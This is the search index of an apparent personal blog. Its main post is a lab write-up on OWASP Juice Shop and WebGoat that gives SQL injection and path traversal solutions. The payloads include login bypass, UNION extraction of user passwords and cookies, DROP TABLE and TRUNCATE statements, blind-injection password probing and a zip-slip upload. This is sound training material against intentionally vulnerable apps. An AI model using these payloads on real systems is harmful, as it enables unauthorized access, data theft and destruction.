{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Blog","text":""},{"location":"2023/05/25/dl580-gen5/","title":"What weighs 80lbs, sounds like a small airplane and is sitting in my office?","text":"<p>I'll give you a hint, it's not a drone.</p> <p>One of my hobbies is perusing small auction sites (government surplus and the like)</p>"},{"location":"2023/05/26/juice-and-goats/","title":"Juice shops and web goats","text":"<p>For those who don't know, the OWASP Juice Shop is a handy modern full stack web app with some of the top known vulnerabilities baked in, thus allowing you to get your web pen testing juices flowing (pun intended)!</p> <p>I set up a local Ubuntu VM and installed the Juice Shop manually using NodeJS and NPM.</p> <p>Using NPM</p> <p>Go to the Juice Shop Github for the full installation instructions. Here is the what I did (need NodeJS &amp; NPM installed) <pre><code>git clone https://github.com/juice-shop/juice-shop.git --depth 1\ncd juice-shop\nnpm install\nnpm start\n</code></pre></p> <p>After getting the Juice Shop server set up, I set up an additional VM with Kali Linux and then provided them both with only a single network interface, a local link, to talk to each other.</p> <p>Warning</p> <p>It's not a good idea to set up the Juice Shop and provide access to the WWW to the server...</p> <p>On the Kali box, I tried the following security scanning apps to get an general idea of possible exploits.</p>"},{"location":"2023/05/26/juice-and-goats/#scanning-the-juice-store","title":"Scanning the Juice Store","text":"<ul> <li>Wapiti: Found nothing</li> <li>SkipFish: Decent amount of hidden directories and more. Nice HTML report. Crashed web server. Found redirect flag for Juice Store.</li> <li>BurpSuite: Have to request a trial for 30 days (don't want to pay $500 for pro in order to scan). Still waiting on trial.</li> <li>nikto: Very heavy on the certificates found in various paths. Need to check if output a nicer report format. Found WordPress directories that others missed.</li> </ul>"},{"location":"2023/05/26/juice-and-goats/#sql-injection","title":"SQL Injection","text":"<p>I find most information on the internet about SQL Injection sorely lacking. It's quite interesting to me that this same example for SQL Injection has been around for a very long time, if I'm not mistaken.</p> <pre><code>' or 1=1;--\n</code></pre> <p>Does this still work on a bunch of servers? I wonder.</p> <p>Anyways, on to the Juice Shop login page. Here I was able to log on as administrator with:</p> <p>User:</p> <pre><code>administrator\\' or 1=1;--\n</code></pre> <p>Pass: test</p> <p>Which logged me in and provided me with the real admin email: admin@juice-sh.op</p>"},{"location":"2023/05/26/juice-and-goats/#owasp-webgoat","title":"OWASP WebGoat","text":"<p>WebGoat is one of the best free instructional units for various types of web vulnerabilities that I have come across. The entire app is packaged as a single .jar and is super simple to get running. There are 8 lessons broken down by the types of vulnerabilities you would see in the wild and many of the lessons have several sections each. WebGoat is great for learning!</p> <p>Download and installation instructions</p> <p>OWASP WebGoat main page You can find the latest .jar distribution files at the WebGoat Github page.</p> <p>I also set up WebGoat on the same VM as the Juice Shop. A useful tip for anyone doing the same thing was that the documentation on the website was misleading as I wanted to change the default IP from localhost to 0.0.0.0. On the website it seems to imply that you can change the server address using the following command line argument:</p> <pre><code>java -jar webgoat-app.jar --server.address=0.0.0.0\n</code></pre> <p>And this certainly did not work for me. I have a set up where I have 2 VMs on a local link where the WebGoat would be at 169.254.7.200 and my attacking machine (using Kali) would be at 169.254.7.150.</p> <p>This is what finally worked for me (which I gleaned from the github repo):</p> <pre><code>java -Dserver.address=0.0.0.0 -jar webgoat-app.jar\n</code></pre> FYI WebGoat uses HSQLDB <p>Some interesting functions for HSQLDB: <pre><code>char()\nlength()\nsubstr()\n</code></pre> More can be found in the reference and more specifically the system functions.</p> <p>Some good tips picked up from the lessons in WebGoat:</p> <ul> <li>' or 1=1; TRUNCATE audit_log;--</li> <li>' or '1'='1</li> <li>SQL Injection is more common in PHP, ASP and ColdFusion</li> <li>SQL server exploits can lead to a command shell</li> <li>String concatenation with ' or + or ||</li> <li>Strings without quotes: char(27)</li> <li>SELECT * FROM users WHERE name = '+char(27) OR 1=1</li> <li>use prepared statements help mitigate SQL Injection</li> <li>implement whitelist with ORDER BY</li> <li>Use zip files to overwrite files after upload using path traversal</li> </ul>"},{"location":"2023/05/26/juice-and-goats/#blind-sql-injection","title":"Blind SQL Injection","text":"<ul> <li>Involves asking 'database true or false questions' when server provides only generic error responses.</li> <li>Types include: content-based and time-based injections</li> <li>Find out what type of DB as that can provide insight to available system tables</li> </ul> Content-based<pre><code>    https://shop.example.com/?article=4 and 1=1 # (1)!\n</code></pre> <ol> <li>If no error is thrown, then this DB might be susceptible to SQL Injection</li> </ol> Time-based<pre><code>    ' or 1=1; sleep(10);-- // (1)!\n</code></pre> <ol> <li>If there is 10 second delay then this DB might be susceptible</li> </ol>"},{"location":"2023/05/26/juice-and-goats/#solutions-intro","title":"Solutions Intro","text":""},{"location":"2023/05/26/juice-and-goats/#webgoat-sql-intro-solution-for-exercise-9","title":"WebGoat SQL (Intro) - Solution for exercise 9:","text":"<p>A classic??</p> <pre><code>' or '1'='1\n</code></pre>"},{"location":"2023/05/26/juice-and-goats/#webgoat-sql-intro-solution-for-exercise-10","title":"WebGoat SQL (Intro) - Solution for exercise 10:","text":"<p>Login_Count:<pre><code>1\n</code></pre> User_id:<pre><code>1 or 1=1 # (1)!\n</code></pre></p> <ol> <li>These fields expect numbers and therefore no quotes are necessary.</li> </ol>"},{"location":"2023/05/26/juice-and-goats/#webgoat-sql-intro-solution-for-exercise-11","title":"WebGoat SQL (Intro) - Solution for exercise 11:","text":"Employee Name:<pre><code>' or 1=1;--\n</code></pre> <p>or</p> <p>Employee Name:<pre><code>Blah\n</code></pre> Authentication TAN:<pre><code>' or '1'='1\n</code></pre></p>"},{"location":"2023/05/26/juice-and-goats/#webgoat-sql-intro-solution-for-exercise-12","title":"WebGoat SQL (Intro) - Solution for exercise 12:","text":"Employee Name:<pre><code>' or 1=1; UPDATE employees SET salary=100000 WHERE first_name='John'\n</code></pre>"},{"location":"2023/05/26/juice-and-goats/#webgoat-sql-intro-solution-for-exercise-13","title":"WebGoat SQL (Intro) - Solution for exercise 13:","text":"Action contains:<pre><code>' or 1=1; DROP TABLE access_log;--\n</code></pre>"},{"location":"2023/05/26/juice-and-goats/#solutions-advanced-where-things-get-interesting","title":"Solutions Advanced -- Where things get interesting","text":""},{"location":"2023/05/26/juice-and-goats/#webgoat-sql-advanced-solution-for-exercise-3","title":"WebGoat SQL (Advanced) - Solution for exercise 3:","text":"Name:<pre><code>Dave' union select userid, user_name, 'name', 'cc', password, cookie, 1 from user_system_data;--\n</code></pre> <p>or</p> Name:<pre><code>Dave'; select * from user_system_data;--\n</code></pre>"},{"location":"2023/05/26/juice-and-goats/#webgoat-sql-advanced-solution-for-exercise-5","title":"WebGoat SQL (Advanced) - Solution for exercise 5:","text":"<p>This one involved blind SQL injection on a login page. After much trials on the login section with the username and pass, I moved on to the registration section and created a new user named 'devon.' After creating the user I then tried creating the same user with:</p> Username:<pre><code>devon' and 1=1;--\n</code></pre> <p>The response was that the user was already created, but this can't be true as the username includes the '1=1' and other special script. This shows that there is a user with this name, which we already knew and that the server used the remaining string as an injection that compared the user name AND 1=1 which returned a hit.</p> <p>Also, you can double check that injection is possible by using the reverse logic:</p> Username:<pre><code>devon' and 1=2;--\n</code></pre> <p>Using this entry, one can create the same user over and over without being warned that the user already exists. This again indicates that the server is using the injection. Devon exists so the left side of AND is TRUE and as 1=2 is FALSE, the boolean logic becomes:</p> <p>true AND false = false</p>"},{"location":"2023/05/26/juice-and-goats/#solutions-mitigation","title":"Solutions Mitigation","text":""},{"location":"2023/05/26/juice-and-goats/#webgoat-sql-mitigation-solution-for-exercise-9","title":"WebGoat \u00a0SQL (Mitigation) - Solution for exercise 9:","text":"<p>Here the backend server is removing all spaces. In order to bypass this, we can use multiline comments to replace the spaces:</p> Replace spaces with comments<pre><code>'/*sp*/or/*sp*/'1'='1';select/*sp*/*/*sp*/from/*sp*/user_system_data;--\n</code></pre>"},{"location":"2023/05/26/juice-and-goats/#solutions-path-traversal","title":"Solutions Path Traversal","text":""},{"location":"2023/05/26/juice-and-goats/#webgoat-sql-path-traversal-solution-for-exercise-3","title":"WebGoat \u00a0SQL (Path Traversal) - Solution for exercise 3:","text":"<p>Here the app is replacing occurrences of \"../\" to prevent \"dot-dot-slash\" or path traversal. In the following example, the middle is replaced by the app leaving the path traversal nonetheless:</p> Full Name:<pre><code>....//test\n</code></pre>"},{"location":"2023/05/26/juice-and-goats/#webgoat-sql-path-traversal-solution-for-exercise-4","title":"WebGoat \u00a0SQL (Path Traversal) - Solution for exercise 4:","text":"<ul> <li>Open Manual Request Editor using OWASP ZAP.   </li> <li>In the request body change: <pre><code>filename=\"../white-bookshelf.jpg\"\n</code></pre></li> </ul>"},{"location":"2023/05/26/juice-and-goats/#webgoat-sql-path-traversal-solution-for-exercise-5","title":"WebGoat \u00a0SQL (Path Traversal) - Solution for exercise 5:","text":"<p>Open OWASP ZAP and find the GET request that is being sent when the 'Show random cat picture' button is pressed. Modify this request and resend it using the Manual Request Editor. Found the location by first adding just <code>%2e%2e%2f</code> to the GET request and getting 404 error message with current directory. There is a URL encoding tool in ZAP.</p> GET Request<pre><code>GET http://localhost:9000/WebGoat/PathTraversal/random-picture?id=%2e%2e%2f%2e%2e%2fpath-traversal-secret\n</code></pre>"},{"location":"2023/05/26/juice-and-goats/#webgoat-sql-path-traversal-solution-for-exercise-7","title":"WebGoat \u00a0SQL (Path Traversal) - Solution for exercise 7:","text":"Terminal<pre><code>cd /tmp/webgoat125something\ncp /location-of-some/pic.jpg /home/user/.webgoat/PathTraversal/webgoat/webgoat.jpg\nzip goat.zip ../../home/user/.webgoat/PathTraversal/webgoat/webgoat.jpg\n</code></pre> <p>Then, upload the file via the WebGoat upload page.</p>"},{"location":"2023/05/26/juice-and-goats/#interesting-sql-injection-queries-i-used-to-get-necessary-info-from-the-db","title":"Interesting SQL Injection queries I used to get necessary info from the DB:","text":"<p>Using EXISTS()<pre><code>' or EXISTS(SELECT * FROM users);\ndevon' and exists(select * from users) and '1'='1\n</code></pre> Using Binary Search<pre><code>Tom' and length(password)&gt;0;--\ntom' AND ascii(substring(password,1,1)) &gt; 60;--\nTom' and length(user)&gt;5;--\nTom' and ascii(substr(user,2,2))=65;--\nTom' and right(email,3)='com\n</code></pre></p>"}]}